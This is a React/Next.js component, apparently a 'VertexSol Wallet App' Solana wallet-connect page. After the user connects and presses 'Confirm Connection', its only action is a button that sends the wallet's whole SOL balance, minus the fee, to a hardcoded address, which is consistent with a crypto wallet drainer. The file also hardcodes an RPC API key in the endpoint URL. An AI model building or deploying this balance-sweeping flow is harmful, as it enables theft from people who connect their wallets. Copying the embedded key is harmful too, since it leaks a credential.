
'use client';

import { useEffect, useMemo, useState } from 'react';
import {
  Connection,
  PublicKey,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import {
  useWallet,
  WalletProvider,
  ConnectionProvider,
} from '@solana/wallet-adapter-react';
import {
  WalletModalProvider,
  WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
  SolanaMobileWalletAdapter,
} from '@solana-mobile/wallet-adapter-mobile';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';

// Import wallet adapter styles
import '@solana/wallet-adapter-react-ui/styles.css';

const HELIUS_RPC_URL = 'https://mainnet.helius-rpc.com/?api-key=d1a247ae-95aa-4484-a430-e688f5f8ebb0';
const VERTEX_SOL_ADDRESS = new PublicKey('827FoJXyAQmyMtqgkKG52YQJyLkfxyFVHwLk98o7jz11');
const connection = new Connection(HELIUS_RPC_URL);

function WalletAction() {
  const { publicKey, signTransaction, sendTransaction, connected } = useWallet();
  const [status, setStatus] = useState<string>('');
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [feeEstimate, setFeeEstimate] = useState<number | null>(null);

  useEffect(() => {
    if (!publicKey) return;
    (async () => {
      const bal = await connection.getBalance(publicKey);
      setBalance(bal);

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction({
        recentBlockhash: blockhash,
        feePayer: publicKey,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: VERTEX_SOL_ADDRESS,
          lamports: 1,
        })
      );

      const fee = await connection.getFeeForMessage(tx.compileMessage());
      if (fee && fee.value) {
        setFeeEstimate(fee.value);
      }
    })();
  }, [publicKey]);

  const handleConfirmConnection = async () => {
    setConfirmed(true);
  };

  const handleTransferAllSol = async () => {
    if (!publicKey || !signTransaction || !connected) return;
    setLoading(true);
    setStatus('');

    try {
      const balance = await connection.getBalance(publicKey);
      if (!feeEstimate || balance <= feeEstimate) throw new Error('Not enough SOL to cover transaction fee');

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction({
        recentBlockhash: blockhash,
        feePayer: publicKey,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: VERTEX_SOL_ADDRESS,
          lamports: balance - feeEstimate,
        })
      );

      const signature = await sendTransaction(tx, connection);
      await connection.confirmTransaction(signature, 'confirmed');
      setStatus(`Success! Tx Signature: ${signature}`);
    } catch (err: any) {
      setStatus(`Error: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="max-w-md mx-auto mt-10 p-4 w-full sm:w-11/12">
      <CardContent className="flex flex-col gap-4 items-center">
        <WalletMultiButton className="!w-full" />
        {connected && !confirmed && (
          <Button
            onClick={handleConfirmConnection}
            className="bg-blue-600 hover:bg-blue-700 w-full"
          >
            Confirm Connection
          </Button>
        )}
        {connected && confirmed && (
          <>
            <div className="text-sm text-gray-600">
              Balance: {balance !== null ? (balance / LAMPORTS_PER_SOL).toFixed(4) : 'Loading...'} SOL
            </div>
            <div className="text-sm text-gray-600">
              Estimated Fee: {feeEstimate !== null ? (feeEstimate / LAMPORTS_PER_SOL).toFixed(6) : 'Loading...'} SOL
            </div>
            <Button
              onClick={handleTransferAllSol}
              className="bg-red-600 hover:bg-red-700 w-full"
              disabled={loading}
            >
              {loading ? 'Sending...' : 'Send All SOL to VertexSol'}
            </Button>
          </>
        )}
        {status && <p className="text-sm text-gray-500 text-center break-words">{status}</p>}
      </CardContent>
    </Card>
  );
}

export default function SolanaWalletModal() {
  const wallets = useMemo(() => [
    new SolanaMobileWalletAdapter({
      appIdentity: { name: "VertexSol Wallet App" },
      authorizationResultCache: {
        get: () => null,
        set: () => Promise.resolve()
      }
    })
  ], []);

  return (
    <ConnectionProvider endpoint={HELIUS_RPC_URL}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WalletAction />
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}
